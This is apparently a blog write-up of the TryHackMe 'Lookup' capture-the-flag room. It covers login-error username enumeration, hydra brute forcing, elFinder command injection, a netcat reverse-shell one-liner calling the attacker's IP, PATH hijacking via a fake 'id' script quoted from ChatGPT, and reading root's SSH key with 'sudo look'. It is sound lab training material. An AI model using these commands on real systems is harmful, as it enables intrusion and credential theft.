> **Lookup** offers a treasure trove of learning opportunities for aspiring hackers. This intriguing machine showcases various real-world vulnerabilities, ranging from web application weaknesses to privilege escalation techniques. By exploring and exploiting these vulnerabilities, hackers can sharpen their skills and gain invaluable experience in ethical hacking. Through “Lookup,” hackers can master the art of reconnaissance, scanning, and enumeration to uncover hidden services and subdomains. They will learn how to exploit web application vulnerabilities, such as command injection, and understand the significance of secure coding practices. The machine also challenges hackers to automate tasks, demonstrating the power of scripting in penetration testing.

Sounds like fun! Let’s get into it.

![](https://miro.medium.com/v2/resize:fit:688/0*QdzVTLoPf85azOR-)

Official Lookup image from the TryHackMe room

# Enumeration & Information Gathering

As always, we’re going to start the box with an `nmap`scan to find open ports on the machine. We discover two ports: 22 running `ssh`& 80 running an apache`http` server.

![](https://miro.medium.com/v2/resize:fit:875/1*Tl9bKEKIubqDAAisPO9Evg.png)

_When you first navigate to the IP address (on port 80), you may not get a webpage loaded, but you will see the page’s domain in the URL bar. (shown below) To fix this, add the IP followed by the domain in the_ `_/etc/hosts_`_file like so:_

echo "MACHINE_IP lookup.thm" >> /etc/hosts  
  
example:  
echo "10.10.139.218 lookup.thm" >> /etc/hosts

![](https://miro.medium.com/v2/resize:fit:875/1*x3IarIUjIfGqWiop-GNhcg.png)

Navigating to lookup.thm, this is what we come across, simply a login page

![](https://miro.medium.com/v2/resize:fit:875/1*9rMHIHOSo3BCEnJncb6h4Q.png)

Since we don’t really have any leads on usernames or passwords so far, we need to do some extra enumeration to lead us in the right direction.

First, I tried looking for hidden directories and subdirectories, with no luck

gobuster dir -u http://lookup.thm/ -w /usr/share/wordlists/dirb/big.txt -t 50  
  
ffuf -u http://lookup.thm/ -w /usr/share/wordlists/dirb/subdomains-top1mil-20000.txt -H "Host: FUZZ.lookup.thm" -ac

![](https://miro.medium.com/v2/resize:fit:875/1*G3R_mbSPJ238hY9jwfw31g.png)

Gobuster and FFUF showing minimal results

Moving away from directory enumeration, let’s do some work on the login functionality itself. Intercepting a request with burp, we can see that the system displays the following error message if we send an account that doesn’t exist (**NotARealUsername,** in this case).

![](https://miro.medium.com/v2/resize:fit:711/1*s0J42EO1yGj__EbKJrImFw.png)

So we know that it **NotARealUsername** is not a valid username, but what if we _do_ enter a valid one? A very common username for web logins is **admin.** Let’s try logging in with **admin** as our username.

![](https://miro.medium.com/v2/resize:fit:713/1*FgG97alNssDUGAqVbiOIag.png)

A different response! This time, it is showing that we have the wrong password, but nothing about the username. This error confirms that **admin** is a valid username.

This makes me curious as to what other usernames we can discover using this technique. Of course we can’t try them all manually, so we can FFUF to automate this process.

ffuf -w {path_to_wordlist} -X POST -d "username=FUZZ&password=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://lookup.thm/login.php -fs 74

![](https://miro.medium.com/v2/resize:fit:875/1*PhJPeTWnsoamRawlWxSv5Q.png)

# Initial Foothold

Looks like we found another user! Now we have two users we can attempt to brute force the login for. First, let’s try the admin user using hydra.

hydra -l admin -P wordlist.txt lookup.thm http-post-form "/login.php/:username=^USER^&password=^PASS^:Wrong password. Please try again." -v 

![](https://miro.medium.com/v2/resize:fit:875/1*yZ6J3nVAkwNCx9VYNMnP2w.png)

We’re successful! But strangely enough, when trying to login, we get the same error.

![](https://miro.medium.com/v2/resize:fit:788/1*0fcSlytAY0TeRqhEeJpwGA.png)

Keep in mind though, we have the user **jose** still. Let’s see if there is a reused password.

![](https://miro.medium.com/v2/resize:fit:708/1*3iPO2Wn7vB4B3RE_Deh53g.png)

Our guess is correct! The password we found for the **admin** user works for **jose!** Here is what the login page leads to:

![](https://miro.medium.com/v2/resize:fit:875/1*Yr7Oi3_lnTQYLJWvTsb8nQ.png)

Similarly to the start, we’re going to have to add this subdomain to our `/etc/hosts` file. We can simply add the subdomain after our original entry of `lookup.thm.`the file should now look like this:

```
echo "10.10.139.218 lookup.thm files.lookup.thm" >> /etc/hosts
```

Now we can successfully navigate to the new webpage. It looks like it is a file sharing server, which makes sense due to the subdomain!

![](https://miro.medium.com/v2/resize:fit:875/1*7DAHejGuZmoc2c9enpMPsA.png)

Going through all of these files, there isn’t a ton to go off of. There are some credentials here and there but they don’t really lead to anything immediate. Browsing around this page more, I found the technology behind the software with a version number attached!

![](https://miro.medium.com/v2/resize:fit:651/1*lXQgJUPHWBV0Fsrsb00jxg.png)

By googling “elFinder 2.1.47 exploit”, I found this exploit:

[

## OffSec's Exploit Database Archive

### elFinder 2.1.47 - 'PHP connector' Command Injection. CVE-2019-9194 . webapps exploit for PHP platform

www.exploit-db.com



](https://www.exploit-db.com/exploits/46481?source=post_page-----62006f6cdaa1---------------------------------------)

This exploit takes advantage of a weakness in the PHP connector implementation in elFinder. This weakness causes command injection, and therefore RCE, enabling us to get a reverse shell! Let’s try it out:

![](https://miro.medium.com/v2/resize:fit:631/1*afQdue27NsXzhGZ4H5FoLg.png)

We’re in!

We can explore the entire file system through `ls, cat,`and other similar commands. We confirm that the user on this box is **think**.

![](https://miro.medium.com/v2/resize:fit:816/1*wiSqusRB2MjURTblRjGT8Q.png)

Obviously, we can’t read files in their home directory, but we do know what is in there. The interesting files are obviously going to be the ssh directory and the .passwords folder file. But how can we read them?

![](https://miro.medium.com/v2/resize:fit:759/1*Et0JOMEl5g4R81694HRujQ.png)

Going back to the file share server, we find this file:

![](https://miro.medium.com/v2/resize:fit:875/1*zoYkCQXF6yenumAOC4HrgQ.png)

This sure does look like our user, but I don’t have high hopes with this one for some reason. And of course, no luck:

![](https://miro.medium.com/v2/resize:fit:875/1*kYiTr31AtlOhR3x-LEvLNg.png)

Trying to brute force SSH again via the small words given to us on the file share system.

![](https://miro.medium.com/v2/resize:fit:755/1*RHKvudmxjmq74bhcFcGU8A.png)

![](https://miro.medium.com/v2/resize:fit:875/1*aFmi4-DW7_E6GAvf-_9Htg.png)

Still no luck. Looks like we’re going to have to laterally move throughout the system with the access we already have as the **www-data** user.

To do this more efficiently, let’s upgrade our shell to a proper one.

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.2.113.254 4444 >/tmp/f  
  
URL encoded (it is a web shell, need to URL encode)  
  
rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Cbash%20-i%202%3E%261%7Cnc%2010.2.113.254%204444%20%3E%2Ftmp%2Ff

![](https://miro.medium.com/v2/resize:fit:875/1*1ifTyE6OVYvn5TpYqdTLnQ.png)

That’s more like it! Now that we have our proper shell on the machine, lets run linpeas to see if there are any low hanging fruit we can grab.

![](https://miro.medium.com/v2/resize:fit:875/1*eWuoj5xgb8YmzCVb9thS_Q.png)

As seen with previous writeups, the **“Files with Interesting Permissions”** section of linpeas is always a good one to check out.

![](https://miro.medium.com/v2/resize:fit:875/1*sCMxNdkDixZG9CpNEwfCHg.png)

# Exploitation

Highlighted above is a binary that linpeas detected as unknown, or not installed by default for linux. Checking it out with the `strings` command, we find some interesting information!

![](https://miro.medium.com/v2/resize:fit:845/1*P7UiPgy05kpL98ueeZ12sQ.png)

It looks like the binary is interacting with the `.passwords` file we saw earlier in **think’s** directory. This is confirmed by running the binary, as seen below:

![](https://miro.medium.com/v2/resize:fit:829/1*iIS_lRsPT4v2u7WFR-itmg.png)

After running the binary, it looks like it is trying to read the `.passwords` file from the current users directory using the id command and UIDs. I wonder if there is a way to spoof our UID in order to trick this binary into thinking that we’re think?

At this point, I was a little stuck. I had the right idea, but didn’t know how to execute it. Thankfully, I was able to use the great powers of ChatGPT to point me in the right direction:

> The binary `pwm` is likely using the `id` command to extract the UID and username dynamically. Since it may not be using an absolute path (like `/usr/bin/id`), you can hijack this behavior by providing a fake `id` script in a directory you control.
> 
> Step 1: Create a malicious script that mimics the `id` command but returns the UID and username for the `think` user:

echo '#!/bin/bash' > /tmp/id  
echo 'echo "uid=1000(think) gid=1000(think) groups=1000(think)"' >> /tmp/id  
chmod +x /tmp/id

> This script will make any calls to `id` return the desired output as if you are the `think` user.
> 
> Step 2: Modify the `PATH` Environment Variable
> 
> Prepend the `/tmp` directory (where your fake `id` script is located) to the `PATH` variable so that the vulnerable binary `pwm` picks it up instead of the real `id` binary:

export PATH=/tmp:$PATH

Looks like we’ve got our next steps ahead of us!

![](https://miro.medium.com/v2/resize:fit:875/1*z2aOrN6KGRb3E7MByHLULg.png)

![](https://miro.medium.com/v2/resize:fit:875/1*5JEgvozkLSkUMPfa6IT1Aw.png)

This works! We are displayed the entire contents of **think’s** `.passwords` file!

Since I don’t want to try each of the passwords manually, we can do a password spray for **think’s** ssh login using hydra. First, copy this list into a new file on our local machine, and then run the hydra command!

hydra -l think -P thinkWL.txt 10.10.74.90 ssh -V

![](https://miro.medium.com/v2/resize:fit:875/1*wLpQRhYjxMwBvuEcAdiULQ.png)

We found the password for think!

![](https://miro.medium.com/v2/resize:fit:875/1*ayzJ8cFBtyyYFdVUa13akA.png)

# Privilege Escalation

First things first with privilege escalation, we have to see what sudo permissions **think** has:

![](https://miro.medium.com/v2/resize:fit:875/1*m3Yf7_MvfCtuzm6IHvQvNw.png)

This looks like a default binary, and we can confirm it is by looking at [gtfobins](https://gtfobins.github.io/).

![](https://miro.medium.com/v2/resize:fit:875/1*U4dDPmbo_NX8h-FRho9R_w.png)

Based on this entry, it looks like we can read any file with our sudo privileges! The first idea that comes to mind with our newfound privileges is obtaining the root ssh key. We can do this by running this command:

sudo look '' /root/.ssh/id_rsa

![](https://miro.medium.com/v2/resize:fit:840/1*NBUb64M5csqnG47wA9e75w.png)

Giving the `id_rsa` key proper permissions and logging into ssh, we are successful!

![](https://miro.medium.com/v2/resize:fit:875/1*xydoK4uW4-Q5hH2_SX3Zpw.png)

We can now claim our victory by obtaining the root flag!

Another option to gain root is reading the /etc/shadow file and trying to crack the root user’s password. Though this is a less direct method.

![](https://miro.medium.com/v2/resize:fit:875/1*qCw_0v-nYpS4Jtwq5CZS2A.png)

And if you’re really lazy, you can just grab the flag as the think user, but that’s no fun!

![](https://miro.medium.com/v2/resize:fit:479/1*5SOKpV9dOzMfCRoIQgDWkA.png)

Overall, this box was a great challenge of calculated brute forcing, a really unique binary exploit, and a lovely privesc to round things out.

Hope you all had as much fun as I did, and you learned something too.

Happy Hacking!